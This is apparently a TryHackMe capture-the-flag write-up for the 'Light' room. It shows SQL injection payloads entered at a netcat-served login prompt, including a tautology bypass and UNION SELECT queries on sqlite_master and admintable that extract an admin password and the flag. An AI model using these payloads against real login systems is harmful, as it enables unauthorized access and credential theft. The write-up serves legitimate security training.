# Light


IP - 10.10.255.175


## Scanning and Enumeration

- The application is running on port 1337. You can connect to server by using ``` nc 10.10.255.175 1337 ```


## SQL Injection
- Step by step:


1). This proved the login form is vulnerable to SQL injection.
```
Please enter your username: ' OR '1'='1
Password: tF8tj2o94WE4LKC
```

2). This payload queries the internal sqlite_master table, which stores metadata about the database. By selecting tbl_name, we discovered the existence of a table called admintable, confirming the database is SQLite.
```
Please enter your username: smokey' Union Select tbl_name FROM sqlite_master WHERE type='table
Password: admintable
```

3). This query returns with a username from admintable.
```
Please enter your username: ' Union Select username FROM admintable '
Password: TryHackMeAdmin
```

4) This query returns the password for the TryHackMeAdmin user from admintable.
```
Please enter your username: ' Union Select password FROM admintable WHERE username='TryHackMeAdmin
Password: mamZtAuMlrsEy5bp6q17
```

5). This query retrieved the password for any user except TryHackMeAdmin, returning a flag which is the challenge's completion key.
```
Please enter your username: ' Union Select password FROM admintable WHERE username !='TryHackMeAdmin
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```



